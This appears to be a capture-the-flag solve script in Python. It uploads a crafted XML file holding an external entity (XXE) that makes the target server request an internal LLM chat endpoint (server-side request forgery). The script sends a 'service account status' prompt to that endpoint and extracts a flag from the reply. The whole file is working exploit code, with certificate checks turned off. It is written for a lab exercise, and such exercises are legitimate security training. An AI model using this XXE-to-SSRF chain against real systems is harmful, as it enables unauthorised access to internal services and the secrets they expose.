#!/usr/bin/env python3
import requests
import urllib.parse
import urllib3
import json
import re

urllib3.disable_warnings()

TARGET = 'https://f0a8bf17-11fb-4fa6-a319-22f3e8beda9b.222.255.138.122.nip.io'
INTERNAL_LLM = 'http://10.20.239.5:5000/v1/chat'

def get_flag():
    prompt = 'service account status'
    query = urllib.parse.urlencode({'prompt': prompt})
    target_url = f'{INTERNAL_LLM}?{query}'
    
    xml_payload = f'''<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{target_url}">
]>
<root>
    <item>&xxe;</item>
</root>'''

    files = {'file': ('solve.xml', xml_payload, 'application/xml')}
    r = requests.post(f'{TARGET}/api/analyze', files=files, verify=False, timeout=10)
    
    resp_text = r.json().get('analysis', {}).get('content_preview', '')
    parsed = json.loads(resp_text)
    response_msg = parsed.get('response', '')
    
    match = re.search(r'flag\{[a-f0-9\-]+\}', response_msg)
    if match:
        flag = match.group(0)
        print(f'[+] Found Flag: {flag}')
        return flag
    else:
        print('[-] Flag not found in response:')
        print(response_msg)
        return None

if __name__ == '__main__':
    get_flag()
